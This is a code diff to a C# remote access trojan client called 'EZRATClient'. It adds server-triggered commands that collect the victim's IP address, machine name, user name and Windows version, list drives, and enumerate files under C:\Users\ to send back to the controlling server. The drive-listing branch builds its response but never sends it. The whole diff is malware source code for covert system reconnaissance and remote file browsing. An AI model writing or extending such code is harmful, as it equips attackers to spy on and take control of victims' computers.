@@ -9,6 +9,7 @@ using System.IO;
 using System.Net.Sockets;
 using System.Threading;
 using System.Security.Cryptography;
+using EZRATClient.Utils;
 
 namespace EZRATClient
 {
@@ -169,7 +170,7 @@ namespace EZRATClient
             while (true) //While the connection is alive
             {
                 //SendRequest();
-                if (isDisconnect) break; //If we need to disconnect, then break out
+                if (!_clientSocket.Connected) break; //If we need to disconnect, then break out
                 ReceiveResponse(); // Receive data from the server
             }
 
@@ -185,15 +186,82 @@ namespace EZRATClient
 
         private static void HandleCommand(string text)
         {
-            if (text == "test")// i added this to start task manager
+            if (text.StartsWith("getinfo-"))// i added this to start task manager
             {
-                Console.WriteLine("TEST");
+
+                string response = "infoback;";
+                response += text.Substring(8);
+                response += ";";
+                response += SystemInfo.GetLocalIPAddress();
+                response += "¦";
+                response += SystemInfo.GetMachineName();
+                response += "¦";
+                response += SystemInfo.GetUserName();
+                response += "¦";
+                response += SystemInfo.GetWindowsVersion();
+
+                SendCommand(response);
+
+            }
+            else if (text == "lsdrives")
+            {
+                string response = "lsdrives;";
+                string[] drives = SystemInfo.GetDrives();
+                for (int i = 0; i < drives.Length; i += 1)
+                {
+                    response += drives[i];
+                    response += "¦";
+                }
+            }
+            else if (text == "lsfiles")
+            {
+                string path = @"C:\Users\";
+                DirectoryInfo d = new DirectoryInfo(path);
+                List<DirectoryInfo> resD = new List<DirectoryInfo>();
+                List<FileInfo> resF = new List<FileInfo>();
+
+                try
+                {
+                    resD = d.EnumerateDirectories("*", SearchOption.TopDirectoryOnly)
+             .Where(fi => (fi.Attributes & FileAttributes.Normal) == 0).ToList();
+
+                    resF = d.EnumerateFiles("*", SearchOption.TopDirectoryOnly)
+                 .Where(fi => (fi.Attributes & FileAttributes.Normal) == 0).ToList();
+                }
+                catch (Exception ex)
+                {
+                    Console.WriteLine(ex.Message);
+
+                }
+
+
+                string response = "lsfiles;";
+                response += path;
+                response += ";";
+                resD.ForEach((item) =>
+                {
+                    response += item.Name; // Tarte.cs
+                    response += "¦";  // Tarte.cs¦
+                    response += "2";  // Tarte.cs¦2
+                    response += "|";  // Tarte.cs¦2|
+                });
+                resF.ForEach((item) =>
+                {
+                    response += item.Name; // Tarte.cs
+                    response += "¦";  // Tarte.cs¦
+                    response += "1";  // Tarte.cs¦1
+                    response += "|";  // Tarte.cs¦1|
+                });
+
+                SendCommand(response);
             }
         }
 
 
 
-            private static string[] GetCommands(string rawData)
+
+
+        private static string[] GetCommands(string rawData)
         {
             List<string> commands = new List<string>(); //The command sent by the server
             int readBack = 0; //How much to read back from the current char pointer
@@ -227,7 +295,7 @@ namespace EZRATClient
                 if (received == 0) return; //If failed to received data return
                 byte[] data = new byte[received]; //Create a new buffer with the exact data size
                 Array.Copy(buffer, data, received); //Copy from the receive to the exact size buffer
-                
+
                 if (isFileDownload) //File download is in progress
                 {
                     Buffer.BlockCopy(data, 0, recvFile, writeSize, data.Length); //Copy the file data to memory
